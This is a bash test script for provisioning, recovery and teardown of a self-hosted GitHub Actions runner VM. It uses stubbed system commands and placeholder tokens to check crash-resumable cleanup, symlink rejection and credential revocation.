printf '{"total_count":1,"runners":[{"id":987654,"name":"disk-arcana-stage","status":"offline","busy":false,"labels":[{"name":"self-hosted"},{"name":"Linux"},{"name":"X64"},{"name":"disk-arcana-stage"}]}]}\n' \
  >"$teardown_unbound_parent/org-api-response.json"
printf 'ExecStart=/usr/bin/qemu-system-x86_64 -drive file=%s/disk.qcow2\n' \
  "$teardown_unbound_root" >"$teardown_unbound_unit"
run_expect 0 'teardown=ok runner_id=UNREGISTERED' \
  'teardown resolves and deletes an exact unbound runner after a host crash' \
  env PATH="$teardown_delete_bin:$PATH" \
    DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_GROUP_API_RESPONSE="$teardown_unbound_parent/group-api-response.json" \
    DISK_ARCANA_STAGE_TEARDOWN_ORG_API_RESPONSE="$teardown_unbound_parent/org-api-response.json" \
    DISK_ARCANA_STAGE_TEARDOWN_UNIT_PATH="$teardown_unbound_unit" \
    DISK_ARCANA_STAGE_TEARDOWN_DIAGNOSTICS_ROOT="$teardown_unbound_diagnostics" \
    DISK_ARCANA_STAGE_TEST_DELETE_LOG="$teardown_unbound_parent/delete.log" \
    bash "$HOST_TEARDOWN" \
      --state-root "$teardown_unbound_root" \
      --github-token-file "$teardown_unbound_parent/token"
grep -F '/orgs/Arcanada-one/actions/runners/987654' \
  "$teardown_unbound_parent/delete.log" >/dev/null ||
  fail 'unregistered host teardown did not delete the exact discovered runner'
printf 'PASS  interrupted host provisioning has a bounded cleanup path\n'

teardown_crash_parent="$fixture_root/teardown-crash"
teardown_crash_root="$teardown_crash_parent/guest"
teardown_crash_unit="$teardown_crash_parent/disk-arcana-stage-vm.service"
teardown_crash_diagnostics="$teardown_crash_parent/diagnostics"
install -d -m 0700 "$teardown_crash_parent" "$teardown_crash_root"
{
  printf 'guest_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_crash_root"
  printf 'host_unit=disk-arcana-stage-vm.service\n'
  printf 'management_port=22446\n'
  printf 'cloud_image_sha256=%s\n' "$cloud_sha"
  printf 'guest_bundle_sha256=%s\n' "$bundle_sha"
  printf 'runner_archive_sha256=%s\n' "$runner_sha"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_id=%s\n' "$runner_id"
} >"$teardown_crash_root/state.manifest"
chmod 0600 "$teardown_crash_root/state.manifest"
{
  printf 'phase=RUNNER_DEREGISTERED\n'
  printf 'runner_id=%s\n' "$runner_id"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_crash_root"
} >"$teardown_crash_root/teardown-current"
chmod 0600 "$teardown_crash_root/teardown-current"
printf 'github-api-token-1234567890\n' >"$teardown_crash_parent/token"
chmod 0600 "$teardown_crash_parent/token"
printf 'ExecStart=/usr/bin/qemu-system-x86_64 -drive file=%s/disk.qcow2\n' \
  "$teardown_crash_root" >"$teardown_crash_unit"

run_expect 99 'injected interruption after unit removal' \
  'teardown journals destructive intent before an interrupted unit removal' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_STATUS=404 \
    DISK_ARCANA_STAGE_TEARDOWN_UNIT_PATH="$teardown_crash_unit" \
    DISK_ARCANA_STAGE_TEARDOWN_DIAGNOSTICS_ROOT="$teardown_crash_diagnostics" \
    DISK_ARCANA_STAGE_TEARDOWN_FAIL_AFTER_UNIT_REMOVE=1 \
    bash "$HOST_TEARDOWN" \
      --state-root "$teardown_crash_root" \
      --github-token-file "$teardown_crash_parent/token"
[[ ! -e "$teardown_crash_unit" ]] || fail 'injected teardown left the unit in place'
grep -Fx 'phase=UNIT_REMOVE_INTENT' "$teardown_crash_root/teardown-current" >/dev/null ||
  fail 'teardown did not persist unit-removal intent before deletion'
run_expect 0 'teardown=ok runner_id=987654' \
  'teardown resumes after unit deletion and preserves diagnostics' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_STATUS=404 \
    DISK_ARCANA_STAGE_TEARDOWN_UNIT_PATH="$teardown_crash_unit" \
    DISK_ARCANA_STAGE_TEARDOWN_DIAGNOSTICS_ROOT="$teardown_crash_diagnostics" \
    bash "$HOST_TEARDOWN" \
      --state-root "$teardown_crash_root" \
      --github-token-file "$teardown_crash_parent/token"
[[ ! -e "$teardown_crash_root" ]] || fail 'resumed teardown left the live state root in place'
find "$teardown_crash_diagnostics" -mindepth 1 -maxdepth 1 -type d -name "*-$runner_id" \
  -print -quit | grep -q . || fail 'resumed teardown did not preserve diagnostics'
printf 'PASS  teardown unit-removal crash is behaviorally resumable\n'

teardown_symlink_parent="$fixture_root/teardown-symlink"
teardown_symlink_root="$teardown_symlink_parent/guest"
teardown_symlink_unit="$teardown_symlink_parent/disk-arcana-stage-vm.service"
teardown_symlink_foreign="$teardown_symlink_parent/foreign"
teardown_symlink_diagnostics="$teardown_symlink_parent/diagnostics"
install -d -m 0700 "$teardown_symlink_parent" "$teardown_symlink_root" \
  "$teardown_symlink_foreign"
{
  printf 'guest_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_symlink_root"
  printf 'host_unit=disk-arcana-stage-vm.service\n'
  printf 'management_port=22446\n'
  printf 'cloud_image_sha256=%s\n' "$cloud_sha"
  printf 'guest_bundle_sha256=%s\n' "$bundle_sha"
  printf 'runner_archive_sha256=%s\n' "$runner_sha"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_id=%s\n' "$runner_id"
} >"$teardown_symlink_root/state.manifest"
chmod 0600 "$teardown_symlink_root/state.manifest"
{
  printf 'phase=UNIT_REMOVED\n'
  printf 'runner_id=%s\n' "$runner_id"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_symlink_root"
} >"$teardown_symlink_root/teardown-current"
chmod 0600 "$teardown_symlink_root/teardown-current"
printf 'github-api-token-1234567890\n' >"$teardown_symlink_parent/token"
chmod 0600 "$teardown_symlink_parent/token"
ln -s "$teardown_symlink_foreign" "$teardown_symlink_diagnostics"
teardown_symlink_before="$(find "$teardown_symlink_parent" -xdev -printf '%P %y %m %l\n' | LC_ALL=C sort | sha256sum | awk '{print $1}')"
run_expect 65 'diagnostics path has a symlink component' \
  'teardown rejects a diagnostics-root symlink before moving state' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_STATUS=404 \
    DISK_ARCANA_STAGE_TEARDOWN_UNIT_PATH="$teardown_symlink_unit" \
    DISK_ARCANA_STAGE_TEARDOWN_DIAGNOSTICS_ROOT="$teardown_symlink_diagnostics" \
    bash "$HOST_TEARDOWN" \
      --state-root "$teardown_symlink_root" \
      --github-token-file "$teardown_symlink_parent/token"
teardown_symlink_after="$(find "$teardown_symlink_parent" -xdev -printf '%P %y %m %l\n' | LC_ALL=C sort | sha256sum | awk '{print $1}')"
[[ "$teardown_symlink_before" == "$teardown_symlink_after" ]] ||
  fail 'diagnostics symlink rejection changed protected state'
printf 'PASS  diagnostics symlink rejection is byte-identical\n'

validation_output="$(
  DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" \
    "${guest_base_args[@]}"
)"
[[ "$validation_output" != *"$registration_token"* && \
   "$validation_output" != *"$removal_token"* ]] ||
  fail 'guest validation exposed registration material'
printf 'PASS  guest validation does not expose registration material\n'

chmod 0644 "$bootstrap_root/registration.env"
run_expect 65 'registration file has unsafe metadata' \
  'world-readable registration material is rejected' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" \
    "${guest_base_args[@]}"
chmod 0600 "$bootstrap_root/registration.env"

printf '%s  runner.tar.gz\n' "$(printf '0%.0s' {1..64})" \
  >"$bootstrap_root/runner.tar.gz.sha256"
run_expect 66 'runner archive digest mismatch' \
  'guest bootstrap rejects runner digest mismatch before mutation' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" \
    "${guest_base_args[@]}"

bootstrap_recovery_root="$fixture_root/bootstrap-recovery-input"
bootstrap_recovery_state="$fixture_root/bootstrap-recovery-state"
bootstrap_recovery_runner="$fixture_root/bootstrap-recovery-runner"
bootstrap_recovery_bin="$fixture_root/bootstrap-recovery-bin"
install -d -m 0700 "$bootstrap_recovery_root" "$bootstrap_recovery_state"
install -d -m 0750 "$bootstrap_recovery_runner" "$bootstrap_recovery_bin"
{
  printf 'phase=REGISTRATION_INTENT\n'
  printf 'commit=%s\n' "$expected_commit"
  printf 'runner_name=disk-arcana-stage\n'
} >"$bootstrap_recovery_state/bootstrap-current"
chmod 0600 "$bootstrap_recovery_state/bootstrap-current"
{
  printf 'runner_url=https://github.com/Arcanada-one\n'
  printf 'runner_group=disk-arcana-stage\n'
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_label=disk-arcana-stage\n'
  printf 'authority_run_id=31444643689\n'
} >"$bootstrap_recovery_state/recovery.env"
chmod 0600 "$bootstrap_recovery_state/recovery.env"
printf 'expired-registration-token-1234567890\n' \
  >"$bootstrap_recovery_root/registration.env"
chmod 0600 "$bootstrap_recovery_root/registration.env"
printf 'fresh-github-api-token-1234567890\n' \
  >"$bootstrap_recovery_state/github-token"
chmod 0600 "$bootstrap_recovery_state/github-token"
printf '{"agentId":987654,"agentName":"disk-arcana-stage"}\n' \
  >"$bootstrap_recovery_runner/.runner"
cat >"$bootstrap_recovery_runner/config.sh" <<'EOF'
#!/usr/bin/env bash
printf 'expired runner token path was invoked\n' >&2
exit 42
EOF
chmod 0755 "$bootstrap_recovery_runner/config.sh"
cat >"$bootstrap_recovery_runner/svc.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
[[ "$1" == uninstall ]]
printf 'svc-uninstall\n' >>"$DISK_ARCANA_STAGE_TEST_RECOVERY_LOG"
EOF
chmod 0755 "$bootstrap_recovery_runner/svc.sh"
cat >"$bootstrap_recovery_bin/curl" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
args="$*"
if [[ "$args" == *'-X DELETE'* ]]; then
  printf 'api-delete\n' >>"$DISK_ARCANA_STAGE_TEST_RECOVERY_LOG"
  printf '204'
elif [[ "$args" == *'/runner-groups/8/runners'* ]]; then
  printf '%s\n' '{"total_count":1,"runners":[{"id":987654,"name":"disk-arcana-stage","status":"offline","busy":false,"labels":[{"name":"self-hosted"},{"name":"Linux"},{"name":"X64"},{"name":"disk-arcana-stage"}]}]}'
else
  printf '%s\n' '{"total_count":1,"runners":[{"id":987654,"name":"disk-arcana-stage","status":"offline","busy":false,"labels":[{"name":"self-hosted"},{"name":"Linux"},{"name":"X64"},{"name":"disk-arcana-stage"}]}]}'
fi
EOF
chmod 0755 "$bootstrap_recovery_bin/curl"
run_expect 0 'recovery=ok runner_name=disk-arcana-stage prior_phase=REGISTRATION_INTENT' \
  'guest recovery uses fresh API authority after runner tokens expire' \
  env PATH="$bootstrap_recovery_bin:$PATH" \
    DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 \
    DISK_ARCANA_STAGE_BOOTSTRAP_STATE_ROOT="$bootstrap_recovery_state" \
    DISK_ARCANA_STAGE_BOOTSTRAP_RUNNER_ROOT="$bootstrap_recovery_runner" \
    DISK_ARCANA_STAGE_TEST_RECOVERY_LOG="$fixture_root/bootstrap-recovery.log" \
    bash "$GUEST_BOOTSTRAP" \
      --bootstrap-root "$bootstrap_recovery_root" \
      --expected-commit "$expected_commit" \
      --expected-hostname disk-arcana-stage \
      --github-token-file "$bootstrap_recovery_state/github-token" \
      --recover-only
grep -Fx api-delete "$fixture_root/bootstrap-recovery.log" >/dev/null ||
  fail 'bootstrap recovery did not execute fresh-authority API revocation'
grep -Fx svc-uninstall "$fixture_root/bootstrap-recovery.log" >/dev/null ||
  fail 'bootstrap recovery did not uninstall the local runner service'
[[ ! -e "$bootstrap_recovery_runner/.runner" &&
   ! -e "$bootstrap_recovery_state/recovery.env" &&
   ! -e "$bootstrap_recovery_root/registration.env" ]] ||
  fail 'bootstrap recovery retained live runner state or recovery authority'
grep -Fx 'phase=RECOVERED' "$bootstrap_recovery_state/bootstrap-current" >/dev/null ||
  fail 'bootstrap recovery did not persist its terminal phase'
printf 'PASS  bootstrap recovery is independent of one-hour runner tokens\n'

bootstrap_terminal_root="$fixture_root/bootstrap-terminal-input"
bootstrap_terminal_state="$fixture_root/bootstrap-terminal-state"
bootstrap_terminal_runner="$fixture_root/bootstrap-terminal-runner"
install -d -m 0700 "$bootstrap_terminal_root" "$bootstrap_terminal_state"
install -d -m 0750 "$bootstrap_terminal_runner"
{
  printf 'phase=AUTHORITY_CONSUMED\n'
  printf 'commit=%s\n' "$expected_commit"
  printf 'runner_name=disk-arcana-stage\n'
} >"$bootstrap_terminal_state/bootstrap-current"
chmod 0600 "$bootstrap_terminal_state/bootstrap-current"
{
  printf 'runner_url=https://github.com/Arcanada-one\n'
  printf 'runner_group=disk-arcana-stage\n'
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_label=disk-arcana-stage\n'
  printf 'authority_run_id=31444643689\n'
} >"$bootstrap_terminal_state/recovery.env"
chmod 0600 "$bootstrap_terminal_state/recovery.env"
printf 'fresh-github-api-token-1234567890\n' >"$bootstrap_terminal_state/github-token"
chmod 0600 "$bootstrap_terminal_state/github-token"
run_expect 99 'injected interruption after terminal recovery journal' \
  'recovery journals RECOVERED before deleting authority' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 \
    DISK_ARCANA_STAGE_BOOTSTRAP_STATE_ROOT="$bootstrap_terminal_state" \
    DISK_ARCANA_STAGE_BOOTSTRAP_RUNNER_ROOT="$bootstrap_terminal_runner" \
    DISK_ARCANA_STAGE_BOOTSTRAP_FAIL_AFTER_RECOVERED=1 \
    bash "$GUEST_BOOTSTRAP" \
      --bootstrap-root "$bootstrap_terminal_root" \
      --expected-commit "$expected_commit" \
      --expected-hostname disk-arcana-stage \
      --github-token-file "$bootstrap_terminal_state/github-token" \
      --recover-only
grep -Fx 'phase=RECOVERED' "$bootstrap_terminal_state/bootstrap-current" >/dev/null ||
  fail 'recovery interruption occurred before terminal journal durability'
[[ -f "$bootstrap_terminal_state/recovery.env" ]] ||
  fail 'recovery interruption deleted authority before its terminal journal'
run_expect 0 'recovery=already-recovered runner_name=disk-arcana-stage' \
  'terminal recovery retry only revokes lingering bootstrap authority' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 \
    DISK_ARCANA_STAGE_BOOTSTRAP_STATE_ROOT="$bootstrap_terminal_state" \
    DISK_ARCANA_STAGE_BOOTSTRAP_RUNNER_ROOT="$bootstrap_terminal_runner" \
    bash "$GUEST_BOOTSTRAP" \
      --bootstrap-root "$bootstrap_terminal_root" \
      --expected-commit "$expected_commit" \
      --expected-hostname disk-arcana-stage \
      --github-token-file "$bootstrap_terminal_state/github-token" \
      --recover-only
[[ ! -e "$bootstrap_terminal_state/recovery.env" ]] ||
  fail 'terminal recovery retry retained recovery authority'
printf 'PASS  recovery authority deletion is terminal-journal ordered\n'

bootstrap_full_root="$fixture_root/bootstrap-full"
bootstrap_full_state="$fixture_root/bootstrap-full-state"
bootstrap_full_runner="$fixture_root/bootstrap-full-runner"
bootstrap_full_journal="$fixture_root/bootstrap-full-journal"
bootstrap_full_import="$fixture_root/bootstrap-full-import"
bootstrap_full_fake_state="$fixture_root/bootstrap-full-fake-state"
bootstrap_full_bin="$fixture_root/bootstrap-full-bin"
install -d -m 0700 "$bootstrap_full_root" "$bootstrap_full_fake_state"
install -d -m 0755 "$bootstrap_full_bin"
cp -a "$bootstrap_root/bundle" "$bootstrap_full_root/bundle"
cat >"$bootstrap_full_root/bundle/install.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf 'bundle-install\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
EOF
cat >"$bootstrap_full_root/bundle/provision-deploy-broker.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf 'broker-install\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
EOF
chmod 0755 "$bootstrap_full_root/bundle/install.sh" \
  "$bootstrap_full_root/bundle/provision-deploy-broker.sh"
rm -f "$bootstrap_full_root/bundle/manifest.sha256"
bash "$DEPLOY_BUNDLE_VALIDATOR" create \
  --root "$bootstrap_full_root/bundle" --commit "$expected_commit" >/dev/null
bootstrap_full_archive_source="$fixture_root/bootstrap-full-archive-source"
install -d -m 0755 "$bootstrap_full_archive_source"
cat >"$bootstrap_full_archive_source/config.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
if [[ "$1" == remove ]]; then
  printf 'config-remove\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
  rm -f -- "$(dirname "$0")/.runner"
else
  printf 'config-register\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
  printf '{"agentId":987654,"agentName":"disk-arcana-stage"}\n' >"$(dirname "$0")/.runner"
fi
EOF
cat >"$bootstrap_full_archive_source/svc.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
case "$1" in
  install)
    : >"$DISK_ARCANA_STAGE_TEST_FAKE_STATE/service-installed"
    printf 'svc-install\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
    ;;
  uninstall)
    rm -f -- "$DISK_ARCANA_STAGE_TEST_FAKE_STATE/service-installed"
    printf 'svc-uninstall\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
    ;;
  *) exit 2 ;;
esac
EOF
chmod 0755 "$bootstrap_full_archive_source/config.sh" \
  "$bootstrap_full_archive_source/svc.sh"
tar -czf "$bootstrap_full_root/runner.tar.gz" \
  -C "$bootstrap_full_archive_source" config.sh svc.sh
bootstrap_full_runner_sha="$(sha256sum "$bootstrap_full_root/runner.tar.gz" | awk '{print $1}')"
printf '%s  runner.tar.gz\n' "$bootstrap_full_runner_sha" \
  >"$bootstrap_full_root/runner.tar.gz.sha256"
chmod 0600 "$bootstrap_full_root/runner.tar.gz" \
  "$bootstrap_full_root/runner.tar.gz.sha256"
write_bootstrap_registration() {
  local target="$1"
  {
    printf 'runner_url=https://github.com/Arcanada-one\n'
    printf 'runner_group=disk-arcana-stage\n'
    printf 'runner_name=disk-arcana-stage\n'
    printf 'runner_label=disk-arcana-stage\n'
    printf 'authority_run_id=31444643689\n'
    printf 'registration_token=%s\n' "$registration_token"
    printf 'removal_token=%s\n' "$removal_token"
  } >"$target"
  chmod 0600 "$target"
}
write_bootstrap_registration "$bootstrap_full_root/registration.env"

cat >"$bootstrap_full_bin/hostname" <<'EOF'
#!/usr/bin/env bash
printf 'disk-arcana-stage\n'
EOF
cat >"$bootstrap_full_bin/id" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
if [[ "$*" == '-u' ]]; then
  printf '%s\n' "$DISK_ARCANA_STAGE_TEST_UID"
elif [[ "$*" == '-g' ]]; then
  printf '%s\n' "$DISK_ARCANA_STAGE_TEST_GID"
elif [[ "$*" == '-u disk-stage' ]]; then
  printf '1001\n'
elif [[ "$*" == 'disk-stage' && -f "$DISK_ARCANA_STAGE_TEST_FAKE_STATE/user-created" ]]; then
  exit 0
else
  exit 1
fi
EOF
cat >"$bootstrap_full_bin/getent" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
[[ "$*" == 'group disk-arcana-deploy' && -f "$DISK_ARCANA_STAGE_TEST_FAKE_STATE/group-created" ]]
EOF
cat >"$bootstrap_full_bin/groupadd" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
: >"$DISK_ARCANA_STAGE_TEST_FAKE_STATE/group-created"
printf 'groupadd\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
EOF
cat >"$bootstrap_full_bin/useradd" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
: >"$DISK_ARCANA_STAGE_TEST_FAKE_STATE/user-created"
printf 'useradd\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
EOF
cat >"$bootstrap_full_bin/usermod" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
case "$*" in
  *--add-subuids*) printf 'disk-stage:200000:65536\n' >>"$DISK_ARCANA_STAGE_TEST_SUBUID" ;;
  *--add-subgids*) printf 'disk-stage:200000:65536\n' >>"$DISK_ARCANA_STAGE_TEST_SUBGID" ;;
esac
printf 'usermod\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
EOF
cat >"$bootstrap_full_bin/apt-get" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf 'apt-get\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
EOF
cat >"$bootstrap_full_bin/loginctl" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
if [[ "$1" == show-user ]]; then printf 'yes\n'; else printf 'loginctl\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"; fi
EOF
cat >"$bootstrap_full_bin/runuser" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
while (($#)) && [[ "$1" != -- ]]; do shift; done
[[ "${1:-}" == -- ]]
shift
exec "$@"
EOF
cat >"$bootstrap_full_bin/systemctl" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
case "$1" in
  list-unit-files)
    [[ -f "$DISK_ARCANA_STAGE_TEST_FAKE_STATE/service-installed" ]] &&
      printf 'actions.runner.Arcanada-one.disk-arcana-stage.service enabled\n'
    ;;
  is-active)
    if [[ "$2" == disk-arcana-server.service || -f "$DISK_ARCANA_STAGE_TEST_FAKE_STATE/runner-active" ]]; then
      printf 'active\n'
    else
      printf 'inactive\n'
    fi
    ;;
  is-enabled) printf 'enabled\n' ;;
  show)
    case "$*" in
      *UnitFileState*) printf 'enabled\n' ;;
      *Restart*) printf 'on-failure\n' ;;
      *StartLimitIntervalUSec*) printf '2min\n' ;;
      *StartLimitBurst*) printf '5\n' ;;
      *) exit 2 ;;
    esac
    ;;
  start)
    [[ "$2" == actions.runner.* ]] && : >"$DISK_ARCANA_STAGE_TEST_FAKE_STATE/runner-active"
    printf 'systemctl-start\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
    ;;
  stop|disable|daemon-reload) : ;;
  --user) [[ "$2" == show-environment ]] ;;
  *) exit 2 ;;
esac
EOF
cat >"$bootstrap_full_bin/curl" <<'EOF'
#!/usr/bin/env bash
printf 'health-check\n' >>"$DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG"
EOF
cat >"$bootstrap_full_bin/podman" <<'EOF'
#!/usr/bin/env bash
[[ "$1" == info ]] && printf 'true\n'
EOF
cat >"$bootstrap_full_bin/unshare" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
cat >"$bootstrap_full_bin/sudo" <<'EOF'
#!/usr/bin/env bash
cat <<'OUT'
User disk-stage may run the following commands on disk-arcana-stage:
    (root) NOPASSWD: /usr/local/sbin/disk-arcana-deploy-broker --deploy *
OUT
EOF
chmod 0755 "$bootstrap_full_bin"/*

bootstrap_full_subuid="$fixture_root/bootstrap-full-subuid"
bootstrap_full_subgid="$fixture_root/bootstrap-full-subgid"
bootstrap_full_socket="$fixture_root/bootstrap-full-docker.sock"
: >"$bootstrap_full_subuid"
: >"$bootstrap_full_subgid"
: >"$bootstrap_full_socket"
chmod 0600 "$bootstrap_full_subuid" "$bootstrap_full_subgid"
chmod 0000 "$bootstrap_full_socket"
bootstrap_full_log="$fixture_root/bootstrap-full.log"
bootstrap_full_env=(
  PATH="$bootstrap_full_bin:$PATH"
  DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1
  DISK_ARCANA_STAGE_BOOTSTRAP_FULL_TESTING=1
  DISK_ARCANA_STAGE_BOOTSTRAP_STATE_ROOT="$bootstrap_full_state"
  DISK_ARCANA_STAGE_BOOTSTRAP_RUNNER_ROOT="$bootstrap_full_runner"
  DISK_ARCANA_STAGE_BOOTSTRAP_JOURNAL_ROOT="$bootstrap_full_journal"
  DISK_ARCANA_STAGE_BOOTSTRAP_IMPORT_ROOT="$bootstrap_full_import"
  DISK_ARCANA_STAGE_BOOTSTRAP_SUBUID_FILE="$bootstrap_full_subuid"
  DISK_ARCANA_STAGE_BOOTSTRAP_SUBGID_FILE="$bootstrap_full_subgid"
  DISK_ARCANA_STAGE_BOOTSTRAP_DOCKER_SOCKET="$bootstrap_full_socket"
  DISK_ARCANA_STAGE_TEST_UID="$(id -u)"
  DISK_ARCANA_STAGE_TEST_GID="$(id -g)"
  DISK_ARCANA_STAGE_TEST_FAKE_STATE="$bootstrap_full_fake_state"
  DISK_ARCANA_STAGE_TEST_SUBUID="$bootstrap_full_subuid"
  DISK_ARCANA_STAGE_TEST_SUBGID="$bootstrap_full_subgid"
  DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG="$bootstrap_full_log"
)
run_expect 0 'bootstrap=ok commit=1111111111111111111111111111111111111111' \
  'guest bootstrap executes its isolated privileged mutation path' \
  env "${bootstrap_full_env[@]}" bash "$GUEST_BOOTSTRAP" \
    --bootstrap-root "$bootstrap_full_root" \
    --expected-commit "$expected_commit" \
    --expected-hostname disk-arcana-stage
for load_bearing_marker in apt-get config-register svc-install bundle-install broker-install health-check; do
  grep -Fx "$load_bearing_marker" "$bootstrap_full_log" >/dev/null ||
    fail "full bootstrap did not execute $load_bearing_marker"
done
grep -Fx 'phase=COMMITTED' "$bootstrap_full_state/bootstrap-current" >/dev/null ||
  fail 'full bootstrap did not persist COMMITTED'
[[ ! -e "$bootstrap_full_root/registration.env" &&
   ! -e "$bootstrap_full_state/recovery.env" ]] ||
  fail 'full bootstrap retained consumed authority'
printf 'PASS  privileged bootstrap behavior is load-bearing\n'

bootstrap_failure_root="$fixture_root/bootstrap-failure"
bootstrap_failure_state="$fixture_root/bootstrap-failure-state"
bootstrap_failure_runner="$fixture_root/bootstrap-failure-runner"
bootstrap_failure_journal="$fixture_root/bootstrap-failure-journal"
bootstrap_failure_import="$fixture_root/bootstrap-failure-import"
bootstrap_failure_fake_state="$fixture_root/bootstrap-failure-fake-state"
bootstrap_failure_subuid="$fixture_root/bootstrap-failure-subuid"
bootstrap_failure_subgid="$fixture_root/bootstrap-failure-subgid"
bootstrap_failure_socket="$fixture_root/bootstrap-failure-docker.sock"
bootstrap_failure_log="$fixture_root/bootstrap-failure.log"
install -d -m 0700 "$bootstrap_failure_root" "$bootstrap_failure_fake_state"
cp -a "$bootstrap_full_root/bundle" "$bootstrap_failure_root/bundle"
install -m 0600 "$bootstrap_full_root/runner.tar.gz" "$bootstrap_failure_root/runner.tar.gz"
install -m 0600 "$bootstrap_full_root/runner.tar.gz.sha256" \
  "$bootstrap_failure_root/runner.tar.gz.sha256"
write_bootstrap_registration "$bootstrap_failure_root/registration.env"
: >"$bootstrap_failure_subuid"
: >"$bootstrap_failure_subgid"
: >"$bootstrap_failure_socket"
chmod 0600 "$bootstrap_failure_subuid" "$bootstrap_failure_subgid"
chmod 0000 "$bootstrap_failure_socket"
run_expect 99 'injected interruption after runner registration' \
  'normal bootstrap failure revokes the runner before terminal authority cleanup' \
  env PATH="$bootstrap_full_bin:$PATH" \
    DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 \
    DISK_ARCANA_STAGE_BOOTSTRAP_FULL_TESTING=1 \
    DISK_ARCANA_STAGE_BOOTSTRAP_STATE_ROOT="$bootstrap_failure_state" \
    DISK_ARCANA_STAGE_BOOTSTRAP_RUNNER_ROOT="$bootstrap_failure_runner" \
    DISK_ARCANA_STAGE_BOOTSTRAP_JOURNAL_ROOT="$bootstrap_failure_journal" \
    DISK_ARCANA_STAGE_BOOTSTRAP_IMPORT_ROOT="$bootstrap_failure_import" \
    DISK_ARCANA_STAGE_BOOTSTRAP_SUBUID_FILE="$bootstrap_failure_subuid" \
    DISK_ARCANA_STAGE_BOOTSTRAP_SUBGID_FILE="$bootstrap_failure_subgid" \
    DISK_ARCANA_STAGE_BOOTSTRAP_DOCKER_SOCKET="$bootstrap_failure_socket" \
    DISK_ARCANA_STAGE_BOOTSTRAP_FAIL_AFTER_REGISTRATION=1 \
    DISK_ARCANA_STAGE_TEST_UID="$(id -u)" \
    DISK_ARCANA_STAGE_TEST_GID="$(id -g)" \
    DISK_ARCANA_STAGE_TEST_FAKE_STATE="$bootstrap_failure_fake_state" \
    DISK_ARCANA_STAGE_TEST_SUBUID="$bootstrap_failure_subuid" \
    DISK_ARCANA_STAGE_TEST_SUBGID="$bootstrap_failure_subgid" \
    DISK_ARCANA_STAGE_TEST_BOOTSTRAP_LOG="$bootstrap_failure_log" \
    bash "$GUEST_BOOTSTRAP" \
      --bootstrap-root "$bootstrap_failure_root" \
      --expected-commit "$expected_commit" \
      --expected-hostname disk-arcana-stage
grep -Fx config-remove "$bootstrap_failure_log" >/dev/null ||
  fail 'normal bootstrap failure did not revoke the runner'
grep -Fx 'phase=RECOVERED' "$bootstrap_failure_state/bootstrap-current" >/dev/null ||
  fail 'normal bootstrap failure did not journal terminal recovery'
[[ ! -e "$bootstrap_failure_root/registration.env" &&
   ! -e "$bootstrap_failure_state/recovery.env" ]] ||
  fail 'normal bootstrap failure deleted authority out of terminal order'
printf 'PASS  normal bootstrap cleanup is behaviorally terminal and revoking\n'
